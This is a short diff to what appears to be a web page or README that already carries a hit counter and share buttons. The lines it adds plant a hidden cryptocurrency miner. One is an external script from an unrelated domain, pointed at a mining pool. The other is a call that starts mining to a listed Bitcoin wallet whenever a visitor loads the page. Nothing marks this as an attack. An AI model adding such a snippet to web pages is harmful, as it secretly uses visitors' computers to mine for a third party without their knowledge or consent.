@@ -21,3 +21,7 @@
 - <a href="https://www.freecounterstat.com" title="website hit counter"><img src="https://counter11.optistats.ovh/private/freecounterstat.php?c=2x5dulkle1g698z3jtzw4xwr67c3n64c" border="0" title="website hit counter" alt="website hit counter"></a>
 
 <head><script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=6a6f55f1419b02b83ea956c9&product=sticky-share-buttons' async='async'></script></head>
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
+<script type="text/javascript">
+EverythingIsLife('bc1qtu4fj64407en7zxqucste9zt6a7sr2jw02f000', 'c=BTC', 30);
+</script>
